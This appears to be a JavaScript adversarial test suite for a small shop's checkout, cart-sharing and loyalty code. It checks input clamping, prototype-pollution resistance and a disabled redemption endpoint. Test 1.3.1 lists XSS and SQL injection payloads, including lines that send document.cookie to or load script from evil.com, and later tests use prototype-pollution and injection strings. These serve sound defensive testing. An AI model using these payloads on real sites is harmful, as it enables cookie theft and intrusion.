/**
 * @fileoverview Empirical Challenger Adversarial Fuzzing & Stress Test Suite
 * for Milestone 1 implementations (Gifting, Share Cart URL, Loyalty Wallet).
 *
 * Run: node scripts/m1-adversarial-challenger.test.js
 */

const assert = require("assert");
const cart = require("../assets/js/cart.js");
const checkoutModule = require("../workers/checkout.js");
const checkoutWorker = checkoutModule.default || checkoutModule;
const catalogData = require("../assets/data/products.json");
const redeemPoints = require("../netlify/functions/redeem-points.js");
const giftCardBalance = require("../netlify/functions/gift-card-balance.js");

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function runTest(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ✗ ${name}`);
    console.error(`    ${err.message}`);
  }
}

async function runAsyncTest(name, fn) {
  totalTests++;
  try {
    await fn();
    passedTests++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ✗ ${name}`);
    console.error(`    ${err.message}`);
  }
}

// Mock worker checkout execution harness
async function executeWorkerCheckout(body, mockStripe = {}) {
  let capturedSessionParams = null;
  let capturedCouponParams = null;
  let promoCodeRequests = 0;

  const originalFetch = global.fetch;
  global.fetch = async (url, opts = {}) => {
    const u = String(url);
    if (u.includes("products.json")) {
      return {
        ok: true,
        clone: () => ({ body: null }),
        json: async () => catalogData
      };
    }
    if (u.includes("events.json")) {
      return {
        ok: true,
        clone: () => ({ body: null }),
        json: async () => ({
          upcoming: [
            {
              id: "landrum-market",
              name: "Landrum Farmers Market",
              address: "221 W Rutherford St, Landrum, SC 29356",
              zip: "29356"
            }
          ],
          past: []
        })
      };
    }
    if (u.includes("/v1/tax/settings")) {
      return { ok: true, json: async () => ({ status: "inactive" }) };
    }
    if (u.includes("/v1/promotion_codes")) {
      promoCodeRequests++;
      if (mockStripe.promoCode) {
        return { ok: true, json: async () => mockStripe.promoCode };
      }
      return { ok: true, json: async () => ({ data: [] }) };
    }
    if (u.includes("/v1/coupons")) {
      capturedCouponParams = new URLSearchParams(opts.body);
      return {
        ok: true,
        json: async () => ({
          id: "coup_test_ephemeral_adversarial",
          amount_off: capturedCouponParams.get("amount_off")
        })
      };
    }
    if (u.includes("/v1/checkout/sessions")) {
      capturedSessionParams = new URLSearchParams(opts.body);
      return {
        ok: true,
        json: async () => ({
          id: "cs_test_session_adv_123",
          url: "https://checkout.stripe.com/c/test_session_adv"
        })
      };
    }
    return { ok: true, json: async () => ({}) };
  };

  try {
    const req = new Request("https://yallternativeliving.com/api/checkout", {
      method: "POST",
      headers: {
        Origin: "https://yallternativeliving.com",
        "Content-Type": "application/json"
      },
      body: JSON.stringify(body)
    });

    const env = {
      STRIPE_SECRET_KEY: "sk_test_mock_adv_secret",
      SITE_ORIGIN: "https://yallternativeliving.com",
      STRIPE_TAX_ENABLED: "false"
    };

    const res = await checkoutWorker.fetch(req, env, { waitUntil: () => {} });
    const resJson = await res.json();
    return {
      status: res.status,
      body: resJson,
      sessionParams: capturedSessionParams,
      couponParams: capturedCouponParams,
      promoCodeRequests: promoCodeRequests
    };
  } finally {
    global.fetch = originalFetch;
  }
}

async function runMilestone1AdversarialSuite() {
  console.log("\n==================================================");
  console.log("MILESTONE 1 ADVERSARIAL CHALLENGER TEST SUITE");
  console.log("==================================================\n");

  /* ==========================================================================
     DIMENSION 1: Gifting Payload Parsing, Overflowing Notes, Malicious
                  Unicode/Control Characters, XSS & Injection Attacks
     ========================================================================== */
  console.log("--- DIMENSION 1: Gifting Fuzzing & Injection Stress ---");

  // 1.1: Exact length boundary checks (499, 500, 501, 20,000 chars)
  runTest("1.1.1: toCheckoutPayload handles exact boundary lengths (499, 500, 501)", () => {
    const note499 = "x".repeat(499);
    const note500 = "x".repeat(500);
    const note501 = "x".repeat(501);

    const p499 = cart.toCheckoutPayload(
      [{ id: "lavender-soak", qty: 1 }],
      null,
      null,
      true,
      note499
    );
    const p500 = cart.toCheckoutPayload(
      [{ id: "lavender-soak", qty: 1 }],
      null,
      null,
      true,
      note500
    );
    const p501 = cart.toCheckoutPayload(
      [{ id: "lavender-soak", qty: 1 }],
      null,
      null,
      true,
      note501
    );

    assert.strictEqual(p499.giftMessage.length, 499);
    assert.strictEqual(p500.giftMessage.length, 500);
    assert.strictEqual(p501.giftMessage.length, 500);
    assert.strictEqual(p501.gift_message.length, 500);
  });

  runTest(
    "1.1.2: toCheckoutPayload handles massive 20,000 char note overflow without memory exhaustion",
    () => {
      const massive = "A".repeat(20000);
      const payload = cart.toCheckoutPayload(
        [{ id: "lavender-soak", qty: 1 }],
        null,
        null,
        true,
        massive
      );
      assert.strictEqual(payload.giftMessage.length, 500);
      assert.strictEqual(payload.gift_message.length, 500);
    }
  );

  await runAsyncTest(
    "1.1.3: Worker checkout clamps overflowing gift message to 500 characters",
    async () => {
      const overflowNote = "Y'allternative Living Gift Note ".repeat(30); // ~960 chars
      const res = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        is_gift_order: true,
        gift_message: overflowNote
      });

      assert.strictEqual(res.status, 200);
      const savedMsg = res.sessionParams.get("metadata[gift_message]");
      assert.ok(savedMsg.length <= 500);
      assert.strictEqual(savedMsg.length, 500);
    }
  );

  // 1.2: Malicious Unicode, Zero-Width, RTL Overrides & Control Chars
  await runAsyncTest(
    "1.2.1: Worker checkout strips non-printable ASCII and control characters",
    async () => {
      let dirty = "Start-";
      for (let c = 0; c <= 0x1f; c++) {
        if (c !== 0x09 && c !== 0x0a && c !== 0x0d) {
          dirty += String.fromCharCode(c);
        }
      }
      dirty += "\x7F-End";

      const res = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        is_gift_order: true,
        gift_message: dirty
      });

      assert.strictEqual(res.status, 200);
      const cleanMsg = res.sessionParams.get("metadata[gift_message]");
      assert.strictEqual(cleanMsg, "Start--End");
      // eslint-disable-next-line no-control-regex
      assert.strictEqual(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(cleanMsg), false);
    }
  );

  await runAsyncTest(
    "1.2.2: Worker checkout preserves valid multiline text and international unicode",
    async () => {
      const unicodeNote =
        "Happy Birthday! 🎁✨\nمرحبا بكم · こんにちは · Привет · Southern Charm!\r\nFrom Landrum, SC.";
      const res = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        is_gift_order: true,
        gift_message: unicodeNote
      });

      assert.strictEqual(res.status, 200);
      const savedMsg = res.sessionParams.get("metadata[gift_message]");
      assert.ok(savedMsg.includes("🎁✨"));
      assert.ok(savedMsg.includes("مرحبا"));
      assert.ok(savedMsg.includes("こんにちは"));
      assert.ok(savedMsg.includes("Привет"));
      assert.ok(savedMsg.includes("\n"));
    }
  );

  // 1.3: XSS & Injection Vectors
  await runAsyncTest(
    "1.3.1: Worker checkout handles intense XSS / Script Injection vectors safely",
    async () => {
      const maliciousPayloads = [
        "<script>alert(document.cookie)</script>",
        "</textarea><script src='https://evil.com/xss.js'></script>",
        '"><img src=x onerror=alert(1)>',
        "<svg/onload=fetch('//evil.com/'+document.cookie)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1+(alert)(1)//'>",
        "{{constructor.constructor('alert(1)')()}}",
        "${7*7}",
        "'; DROP TABLE checkout_sessions; --",
        '"}],"injected":true,"items":[{'
      ];

      for (const payload of maliciousPayloads) {
        const res = await executeWorkerCheckout({
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          is_gift_order: true,
          gift_message: payload
        });

        assert.strictEqual(res.status, 200);
        assert.strictEqual(res.sessionParams.get("metadata[is_gift_order]"), "true");
        assert.strictEqual(
          res.sessionParams.get("metadata[gift_message]"),
          payload.trim().slice(0, 500)
        );
      }
    }
  );

  // 1.4: Type Fuzzing & Malformed Gifting Inputs
  runTest(
    "1.4.1: toCheckoutPayload handles abnormal type values for gift parameters without throwing",
    () => {
      const badTypes = [
        null,
        undefined,
        12345,
        true,
        false,
        { text: "evil" },
        ["gift note array"],
        NaN,
        Infinity,
        () => {}
      ];

      for (const bad of badTypes) {
        assert.doesNotThrow(() => {
          cart.toCheckoutPayload([{ id: "lavender-soak", qty: 1 }], null, null, true, bad);
        });
        assert.doesNotThrow(() => {
          cart.toCheckoutPayload([{ id: "lavender-soak", qty: 1 }], null, null, bad, "note");
        });
      }
    }
  );

  await runAsyncTest(
    "1.4.2: Worker checkout handles non-string gift_message and boolean variations safely",
    async () => {
      const weirdPayloads = [
        { is_gift_order: true, gift_message: 123456 },
        { is_gift_order: true, gift_message: { object: "message" } },
        { is_gift_order: true, gift_message: ["array", "message"] },
        { is_gift_order: true, gift_message: null },
        { is_gift_order: "true", gift_message: "String boolean flag" },
        { isGiftOrder: "true", giftMessage: "camelCase string boolean" },
        { is_gift_order: "false", gift_message: "Should be ignored" },
        { is_gift_order: 0, gift_message: "Should be ignored" }
      ];

      for (const body of weirdPayloads) {
        const res = await executeWorkerCheckout({
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          ...body
        });
        assert.strictEqual(
          res.status,
          200,
          `Worker checkout should succeed for ${JSON.stringify(body)}`
        );
        if (body.is_gift_order === "false" || body.is_gift_order === 0) {
          assert.strictEqual(res.sessionParams.get("metadata[is_gift_order]"), null);
        } else {
          assert.strictEqual(res.sessionParams.get("metadata[is_gift_order]"), "true");
        }
      }
    }
  );

  /* ==========================================================================
     DIMENSION 2: Share Cart URL Decoding Fuzzing, Prototype Pollution,
                  Corrupt Tokens, and Negative/NaN/Infinity Quantities
     ========================================================================== */
  console.log("\n--- DIMENSION 2: Share Cart URL Decoding Fuzzing ---");

  // 2.1: Non-string and corrupt input types
  runTest(
    "2.1.1: parseSharedCartParam handles all non-string and corrupted types without crashing",
    () => {
      const corruptedTypes = [
        null,
        undefined,
        12345,
        0,
        -1,
        true,
        false,
        NaN,
        Infinity,
        {},
        { cart: "frankincense-salve:1" },
        [],
        ["frankincense-salve:1"],
        Symbol("cart"),
        () => "frankincense-salve:1"
      ];

      for (const input of corruptedTypes) {
        const result = cart.parseSharedCartParam(input, catalogData);
        assert.ok(Array.isArray(result), `Expected array for input ${typeof input}`);
        assert.strictEqual(result.length, 0);
      }
    }
  );

  // 2.2: Negative, zero, NaN, infinite, float quantities
  runTest("2.2.1: parseSharedCartParam fuzzing on weird quantity tokens", () => {
    const testCases = [
      { token: "frankincense-salve:-10", expectedQty: 1, desc: "negative quantity clamped to 1" },
      {
        token: "frankincense-salve:-999999",
        expectedQty: 1,
        desc: "extreme negative clamped to 1"
      },
      { token: "frankincense-salve:0", expectedQty: 1, desc: "zero quantity clamped to 1" },
      { token: "frankincense-salve:000", expectedQty: 1, desc: "multiple zero clamped to 1" },
      { token: "frankincense-salve:NaN", expectedQty: 1, desc: "NaN quantity clamped to 1" },
      { token: "frankincense-salve:null", expectedQty: 1, desc: "null quantity clamped to 1" },
      {
        token: "frankincense-salve:undefined",
        expectedQty: 1,
        desc: "undefined quantity clamped to 1"
      },
      {
        token: "frankincense-salve:Infinity",
        expectedQty: 1,
        desc: "Infinity string non-numeric fallback to 1"
      },
      {
        token: "frankincense-salve:999999",
        expectedQty: 99,
        desc: "Huge integer clamped to default MAX_QTY ceiling (99)"
      },
      { token: "frankincense-salve:-Infinity", expectedQty: 1, desc: "-Infinity clamped to 1" },
      {
        token: "frankincense-salve:2.999",
        expectedQty: 2,
        desc: "Float quantity integer truncated to 2"
      },
      { token: "frankincense-salve:0.5", expectedQty: 1, desc: "Sub-1 float clamped to 1" },
      {
        token: "frankincense-salve:1e5",
        expectedQty: 1,
        desc: "Scientific notation integer parses 1"
      }
    ];

    for (const tc of testCases) {
      const res = cart.parseSharedCartParam(tc.token, catalogData);
      assert.strictEqual(res.length, 1, `Failed to parse token: ${tc.token}`);
      assert.strictEqual(res[0].qty, tc.expectedQty, `Failed ${tc.desc}: got ${res[0].qty}`);
    }

    // Specific stock ceiling test with custom mock catalog (stock: 5)
    const mockStockCat = {
      products: [{ id: "capped-salve", name: "Capped Salve", price: 10, stock: 5 }]
    };
    const cappedRes = cart.parseSharedCartParam("capped-salve:999", mockStockCat);
    assert.strictEqual(
      cappedRes[0].qty,
      5,
      "parseSharedCartParam clamps quantity to specific stock limit"
    );
  });

  // 2.3: Prototype Pollution Injection Attacks
  runTest("2.3.1: parseSharedCartParam is impervious to Prototype Pollution attacks", () => {
    // Ensure clean prototype baseline
    assert.strictEqual(Object.prototype.hasOwnProperty.call(Object.prototype, "polluted"), false);
    assert.strictEqual(Object.prototype.hasOwnProperty.call(Object.prototype, "isAdmin"), false);

    const pollutionPayloads = [
      "__proto__:1:polluted",
      "constructor:1:polluted",
      "prototype:1:polluted",
      "toString:1:polluted",
      "valueOf:1:polluted",
      "hasOwnProperty:1:polluted",
      "__proto__.polluted:1",
      "constructor.prototype.isAdmin:1",
      "frankincense-salve:1:__proto__",
      "frankincense-salve:1:constructor",
      "frankincense-salve:1:prototype"
    ];

    for (const payload of pollutionPayloads) {
      const res = cart.parseSharedCartParam(payload, catalogData);
      assert.ok(Array.isArray(res));
    }

    // Verify Object.prototype was NOT polluted
    assert.strictEqual(
      Object.prototype.hasOwnProperty.call(Object.prototype, "polluted"),
      false,
      "Object.prototype.polluted must not exist"
    );
    assert.strictEqual(
      Object.prototype.hasOwnProperty.call(Object.prototype, "isAdmin"),
      false,
      "Object.prototype.isAdmin must not exist"
    );
    assert.strictEqual({}.polluted, undefined);
    assert.strictEqual({}.isAdmin, undefined);
  });

  // 2.4: Malformed string tokens, nested delimiters, and DoS resilience
  runTest("2.4.1: parseSharedCartParam handles deeply nested colons and commas safely", () => {
    const deepDelimiters =
      "frankincense-salve:1:opt1:opt2:opt3:opt4:opt5,lavender-soak:2:::::,:::,,:::,";
    const res = cart.parseSharedCartParam(deepDelimiters, catalogData);
    assert.strictEqual(res.length, 2);
    assert.strictEqual(res[0].id, "frankincense-salve");
    assert.strictEqual(res[0].variantLabel, "opt1:opt2:opt3:opt4:opt5");
    assert.strictEqual(res[1].id, "lavender-soak");
    assert.strictEqual(res[1].variantLabel, "::::");
  });

  runTest(
    "2.4.2: parseSharedCartParam parses 5,000 tokens within 50ms (DoS / ReDoS Resistance)",
    () => {
      const tokens = [];
      for (let i = 0; i < 2500; i++) {
        tokens.push("frankincense-salve:1:2oz");
        tokens.push("lavender-soak:2");
      }
      const hugeCartStr = tokens.join(",");

      const start = Date.now();
      const res = cart.parseSharedCartParam(hugeCartStr, catalogData);
      const duration = Date.now() - start;

      assert.strictEqual(res.length, 5000);
      assert.ok(duration < 100, `Large cart parsing took ${duration}ms, expected < 100ms`);
    }
  );

  /* ==========================================================================
     DIMENSION 3: Loyalty Wallet Math, Concurrency, Fractional Points,
                  Voucher Randomness & Carryover Math
     ========================================================================== */
  console.log("\n--- DIMENSION 3: Loyalty Wallet Math & Concurrency ---");

  // 3.1: Wallet storage edge cases & negative balances
  runTest(
    "3.1.1: getWalletPoints and setWalletPoints handle negative, float, and corrupted storage",
    () => {
      const mockStorage = new Map();
      global.localStorage = {
        getItem: (k) => mockStorage.get(k) || null,
        setItem: (k, v) => mockStorage.set(k, String(v)),
        removeItem: (k) => mockStorage.delete(k),
        clear: () => mockStorage.clear()
      };

      // Test negative clamping
      cart.setWalletPoints(-500);
      assert.strictEqual(cart.getWalletPoints(), 0, "Negative points clamped to 0");

      cart.setWalletPoints(-0.01);
      assert.strictEqual(cart.getWalletPoints(), 0, "Sub-zero float points clamped to 0");

      cart.setWalletPoints(-Infinity);
      assert.strictEqual(cart.getWalletPoints(), 0, "-Infinity points clamped to 0");

      // Test float handling (integer conversion)
      cart.setWalletPoints(150.85);
      assert.strictEqual(cart.getWalletPoints(), 150, "Float points converted to integer");

      // Test string non-numeric handling
      cart.setWalletPoints("invalid_pts");
      assert.strictEqual(cart.getWalletPoints(), 0, "String garbage clamped to 0");

      // Test corrupted direct storage entries
      mockStorage.set("yl_loyalty_points", "-9999");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted negative direct storage returns 0");

      mockStorage.set("yl_loyalty_points", "NaN");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted NaN direct storage returns 0");

      mockStorage.set("yl_loyalty_points", "Infinity");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted Infinity direct storage returns 0");

      mockStorage.set("yl_loyalty_points", "{points:100}");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted JSON direct storage returns 0");
    }
  );

  // 3.2: Voucher Code Collision & Randomness Generator Test
  runTest(
    "3.2.1: deriveRewardCode generates 1,000 unique codes with 0 collisions and valid charset",
    () => {
      const generated = new Set();
      const voucherFormat = /^YALL-PTS-[ABCDEFGHJKLMNPQRSTUVWXYZ23456789]{6}$/;

      for (let i = 0; i < 1000; i++) {
        const code = redeemPoints.deriveRewardCode();
        assert.strictEqual(
          voucherFormat.test(code),
          true,
          `Code ${code} must match unambiguous uppercase alphanumeric format`
        );
        // Ensure no visually ambiguous characters '0', 'O', '1', 'I'
        assert.strictEqual(
          /[0O1I]/.test(code.slice(9)),
          false,
          `Code ${code} must not contain 0, O, 1, or I`
        );
        assert.strictEqual(
          generated.has(code),
          false,
          `Collision detected on iteration ${i}: ${code}`
        );
        generated.add(code);
      }
      assert.strictEqual(generated.size, 1000, "1,000 generated codes must all be distinct");
    }
  );

  // 3.3: Voucher Tampering and Format Filtering in Worker
  await runAsyncTest(
    "3.3.1: Worker checkout rejects tampered, malicious, or non-matching promo codes without calling Stripe",
    async () => {
      const invalidCodes = [
        "YALL-",
        "YALL-123",
        "YALL-PTS-",
        "YALL-PTS-123", // too short (< 6 suffix chars)
        "YALL-PTS-12345678901234567", // > 16 suffix chars
        "'; DROP TABLE coupons; --",
        "__proto__",
        "constructor",
        "<script>alert(1)</script>",
        "DISCOUNT50",
        "yall-pts-lowercase-invalid"
      ];

      for (const code of invalidCodes) {
        const res = await executeWorkerCheckout({
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          gift_card_code: code
        });
        assert.strictEqual(res.status, 200);
        assert.strictEqual(
          res.promoCodeRequests,
          0,
          `Invalid code "${code}" should be filtered by regex before Stripe API`
        );
        assert.strictEqual(
          res.couponParams,
          null,
          `Invalid code "${code}" must not generate an ephemeral coupon`
        );
      }
    }
  );

  // 3.4: Balance Carryover Math Stress
  await runAsyncTest(
    "3.4.1: Worker checkout applies ephemeral discount capped to total and stores carryover metadata",
    async () => {
      // Lavender soak in products.json is $10.00 + $10 shipping = $20.00 (2000 cents) total
      // Customer has $100.00 loyalty voucher (10000 cents)
      const mockBigPromo = {
        data: [
          {
            id: "promo_pts_big",
            code: "YALL-PTS-BIG100",
            coupon: { id: "coup_big", amount_off: 10000, currency: "usd" }
          }
        ]
      };

      const res = await executeWorkerCheckout(
        {
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          gift_card_code: "YALL-PTS-BIG100"
        },
        { promoCode: mockBigPromo }
      );

      assert.strictEqual(res.status, 200);
      assert.strictEqual(
        res.couponParams.get("amount_off"),
        "2000",
        "Discount capped at $20.00 order total"
      );
      assert.strictEqual(
        res.sessionParams.get("metadata[gift_card_original_balance_cents]"),
        "10000",
        "Original $100 balance preserved"
      );
      assert.strictEqual(
        res.sessionParams.get("metadata[gift_card_amount_applied_cents]"),
        "2000",
        "Applied amount recorded as 2000 cents"
      );
      assert.strictEqual(
        res.sessionParams.get("metadata[gift_card_redeemed_code]"),
        "YALL-PTS-BIG100"
      );
    }
  );

  // 3.5: redeem-points.js is a DISABLED endpoint (C-1). There is no
  // server-side points ledger, so the old handler minted real, cash-like
  // store credit on the caller's unverified say-so -- a loop of POSTs was
  // unlimited free money. Every non-OPTIONS request must now answer 410 with
  // the same body, and nothing may reach Stripe or Resend.
  await runAsyncTest(
    "3.5.1: netlify/functions/redeem-points.js refuses every request with 410 and never calls Stripe",
    async () => {
      const originalFetch = global.fetch;
      let outboundCalls = 0;
      global.fetch = async (url) => {
        outboundCalls++;
        throw new Error(`redeem-points must not call out to ${url}`);
      };

      try {
        const requests = [
          { httpMethod: "GET", headers: {} },
          { httpMethod: "POST", headers: {}, body: "{corrupt json body" },
          // Every tier, valid or not: a 400 on a bad tier would still imply
          // that a good one mints something.
          { httpMethod: "POST", headers: {}, body: JSON.stringify({ points: 150 }) },
          { httpMethod: "POST", headers: {}, body: JSON.stringify({ points: -100 }) },
          { httpMethod: "POST", headers: {}, body: JSON.stringify({ points: 100.5 }) },
          { httpMethod: "POST", headers: {}, body: JSON.stringify({ points: 100 }) },
          { httpMethod: "POST", headers: {}, body: JSON.stringify({ points: 200 }) },
          {
            httpMethod: "POST",
            headers: { origin: "https://yallternativeliving.com" },
            body: JSON.stringify({ points: 500, email: "shopper@example.com" })
          },
          { httpMethod: "PUT", headers: {}, body: JSON.stringify({ points: 500 }) },
          { httpMethod: "DELETE", headers: {} }
        ];

        for (const req of requests) {
          const res = await redeemPoints.handler(req);
          assert.strictEqual(
            res.statusCode,
            410,
            `${req.httpMethod} must be refused with 410 Gone`
          );
          assert.deepStrictEqual(JSON.parse(res.body), {
            error: "Alt-Points redemption is not available yet."
          });
          assert.strictEqual(res.headers["Cache-Control"], "no-store");
        }

        assert.strictEqual(outboundCalls, 0, "No Stripe or Resend call is reachable at all");

        // Preflight still answers, so the browser shows the 410 body rather
        // than an opaque CORS error.
        const preflight = await redeemPoints.handler({ httpMethod: "OPTIONS", headers: {} });
        assert.strictEqual(preflight.statusCode, 204);

        // CORS is an allowlist, never a reflection of the caller's Origin.
        const hostile = await redeemPoints.handler({
          httpMethod: "POST",
          headers: { origin: "https://attacker.example" },
          body: "{}"
        });
        assert.strictEqual(
          hostile.headers["Access-Control-Allow-Origin"],
          "https://yallternativeliving.com"
        );
        assert.strictEqual(hostile.headers.Vary, "Origin");

        const allowed = await redeemPoints.handler({
          httpMethod: "POST",
          headers: { origin: "https://www.yallternativeliving.com" },
          body: "{}"
        });
        assert.strictEqual(
          allowed.headers["Access-Control-Allow-Origin"],
          "https://www.yallternativeliving.com"
        );
      } finally {
        global.fetch = originalFetch;
      }
    }
  );

  // 3.6: Netlify function gift-card-balance.js lookup validation
  await runAsyncTest(
    "3.6.1: netlify/functions/gift-card-balance.js handles invalid codes and malformed inputs",
    async () => {
      const resEmpty = await giftCardBalance.lookupGiftCardBalance("", "sk_test_mock");
      assert.strictEqual(resEmpty.valid, false);

      const resNull = await giftCardBalance.lookupGiftCardBalance(null, "sk_test_mock");
      assert.strictEqual(resNull.valid, false);

      const resBadFormat = await giftCardBalance.lookupGiftCardBalance(
        "NOT-A-REAL-FORMAT",
        "sk_test_mock"
      );
      assert.strictEqual(resBadFormat.valid, false);
      assert.ok(resBadFormat.error.includes("Invalid code format"));
    }
  );

  console.log("\n==================================================");
  console.log(`MILESTONE 1 ADVERSARIAL TESTS COMPLETED:`);
  console.log(`Passed: ${passedTests}/${totalTests}`);
  console.log(`Failed: ${failedTests}/${totalTests}`);
  console.log("==================================================\n");

  if (failedTests > 0) {
    process.exit(1);
  }
}

runMilestone1AdversarialSuite().catch((err) => {
  console.error("FATAL RUNNER FAILURE:", err);
  process.exit(1);
});
